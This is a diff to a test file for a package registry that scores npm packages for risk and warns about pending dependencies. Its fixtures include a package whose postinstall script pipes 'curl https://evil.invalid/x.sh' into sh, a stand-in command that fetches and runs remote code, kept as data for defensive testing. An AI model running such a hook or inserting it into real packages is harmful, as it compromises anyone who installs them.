@@ -34,6 +34,7 @@ const manifests = new Map<string, Manifest>([
   ["root", { name: "root", version: "1.0.0", main: "index.js", license: "MIT", dependencies: { "cold-evil": "^1.0.0" } }],
   ["cold-evil", { name: "cold-evil", version: "1.0.0", main: "index.js", license: "MIT", scripts: { postinstall: "curl https://evil.invalid/x.sh | sh" } }],
   ["cold-root", { name: "cold-root", version: "1.0.0", main: "index.js", license: "MIT" }],
+  ["cold-parent", { name: "cold-parent", version: "1.0.0", main: "index.js", license: "MIT", dependencies: { "cold-evil": "^1.0.0" } }],
 ]);
 
 function analysisOf(m: Manifest, code = "module.exports = 1;\n"): Scored {
@@ -92,10 +93,12 @@ const Body = z.object({
 
 const SETTINGS = (npm: string) => ({ baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm, legacyAuth: false, namePolicy: "open", admins: [] }) as const;
 
-async function resolve(input: { url: string; npm: string; name: string; wait: { maxMs: number; pollMs: number }; strict?: boolean }) {
+async function resolve(input: { url: string; npm: string; name: string; wait: { maxMs: number; pollMs: number }; strict?: boolean; askedWaitMs?: number }) {
   const params = new URLSearchParams({ name: input.name, range: "latest" });
 
   if (input.strict) params.set("strict", "1");
+
+  if (input.askedWaitMs !== undefined) params.set("wait", String(input.askedWaitMs));
   const u = new URL(`http://registry.test/-/apm/v1/resolve?${params}`);
   const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, input.wait), Layer.succeed(RegistryConfig, SETTINGS(input.npm)));
   const layers = Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), base);
@@ -110,7 +113,7 @@ type Sql = (q: string, p?: unknown[]) => Promise<void>;
 
 async function withRig(fn: (rig: { url: string; npm: string; sql: Sql }) => Promise<void>, npmUrl?: string): Promise<void> {
   const db = await freshDatabase();
-  const npm = npmUrl === undefined ? fakeNpm(["cold-evil", "cold-root"]) : { url: npmUrl, stop: () => {} };
+  const npm = npmUrl === undefined ? fakeNpm(["cold-evil", "cold-root", "cold-parent"]) : { url: npmUrl, stop: () => {} };
   const c = new Client({ connectionString: db.url });
 
   await c.connect();
@@ -291,6 +294,33 @@ describe("default: a score, an incomplete or missing score, or a pending version
       expect(w?.reasons.length).toBeLessThanOrEqual(3);
       // each reason cites a file and line, or the install script it reads
       expect(w?.reasons.some((r) => /index\.js:\d+|package\.json|postinstall/.test(r))).toBe(true);
+    }));
+
+  // staging: the website's explain gave resolve 25 s, and the registry's 20 s wait plus two walks of vite's tree ran
+  // past it. A caller with its own deadline asks for less, and hears back as soon as that is over.
+  test("a caller that asks to wait less is answered after its own wait, with what is still pending as a warning", () =>
+    withRig(async ({ url, npm }) => {
+      const r = await resolve({ url, npm, name: "root", wait: { maxMs: 5_000, pollMs: 50 }, askedWaitMs: 100 });
+
+      expect(r.status).toBe(200);
+      expect(r.ms).toBeLessThan(2_000);
+      expect(r.body.warnings?.map((w) => [w.name, w.kind])).toEqual([["cold-evil", "pending"]]);
+      const bad = await resolve({ url, npm, name: "root", wait: { maxMs: 0, pollMs: 1 }, askedWaitMs: -5 });
+
+      expect(bad.status).toBe(400);
+    }));
+
+  // review of a76b9fc, finding 3: `pendingRoot ? [] : walked.pending` dropped every pending dependency's warning when the
+  // root itself was pending, so an unscored root over an unscored dependency warned only about the root
+  test("a pending root over a pending dependency warns about both", () =>
+    withRig(async ({ url, npm }) => {
+      const r = await resolve({ url, npm, name: "cold-parent", wait: { maxMs: 100, pollMs: 50 } });
+
+      expect(r.status).toBe(200);
+      expect(r.body.warnings?.map((w) => [w.name, w.kind, w.via])).toEqual([
+        ["cold-parent", "pending", []],
+        ["cold-evil", "pending", ["cold-parent@1.0.0"]],
+      ]);
     }));
 
   test("an unscored root still pending after the wait installs with a pending warning, not skipped", () =>
